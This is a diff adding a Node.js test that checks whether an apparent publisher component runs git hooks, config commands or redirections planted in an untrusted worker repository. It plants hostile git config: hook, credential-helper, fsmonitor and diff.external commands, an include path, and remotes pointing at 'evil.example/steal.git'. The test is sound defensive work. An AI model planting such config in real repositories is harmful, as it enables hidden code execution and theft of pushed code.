@@ -1371,6 +1371,48 @@ test('publisher object transfer never executes a hostile uploadpack.packObjectsH
   fs.rmSync(repo.dir, { recursive: true, force: true });
 });
 
+test('publisher does not leak worker environment or execute worker config/hooks', () => {
+  const repo = makeTempRepo();
+  const marker = path.join(os.tmpdir(), 'shipde-evil-marker-' + Date.now() + '.txt');
+
+  const g = (args) =>
+    spawnSync('git', args, { cwd: repo.dir, encoding: 'utf8', windowsHide: true });
+
+  // Plant a full suite of hostile config
+  g(['config', 'core.hooksPath', 'nul']); // or a planted path
+  g(['config', 'uploadpack.packObjectsHook', 'touch ' + marker]);
+  g(['config', 'include.path', '../evil.cfg']);
+  g(['config', 'credential.helper', '!touch ' + marker]);
+  g(['config', 'url.https://evil.example/steal.git.insteadOf', 'https://github.com/']);
+  g(['config', 'core.fsmonitor', 'touch ' + marker]);
+  g(['config', 'diff.external', 'touch ' + marker]);
+  g(['config', 'remote.origin.url', 'https://evil.example/steal.git']);
+
+  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shipde-evil-'));
+  const cleanDir = path.join(tmp, 'clean.git');
+  fs.mkdirSync(cleanDir);
+  spawnSync('git', ['init', '-q', '--bare', cleanDir], { encoding: 'utf8', windowsHide: true });
+
+  // 1. Verify object transfer (which runs git inside the publisher)
+  transferReviewedObjects(repo.dir, repo.sha, cleanDir, tmp);
+
+  // No marker should be created - no hook or fsmonitor executed
+  assert.strictEqual(fs.existsSync(marker), false, 'hostile hook/config executed');
+
+  // 2. Test publisher environment
+  // The publisher runs in the operator process. The worker env (GIT_CONFIG_COUNT, etc)
+  // is only set inside run-target.ps1. We can assert that publish() does not pass
+  // any custom `env` block that would leak worker variables.
+  const src = fs.readFileSync(path.join(__dirname, '../publisher.js'), 'utf8');
+  assert.ok(
+    !src.includes('env:'),
+    'publisher runCommand must not pass custom env, ensuring it uses operator environment only'
+  );
+
+  fs.rmSync(tmp, { recursive: true, force: true });
+  fs.rmSync(repo.dir, { recursive: true, force: true });
+});
+
 test('launcher clones the worker root without hardlinks so the worker cannot mutate operator objects (Q5)', () => {
   const launcherSrc = getIsolatedLauncher().toString();
   // The flag is asserted on the production launcher.
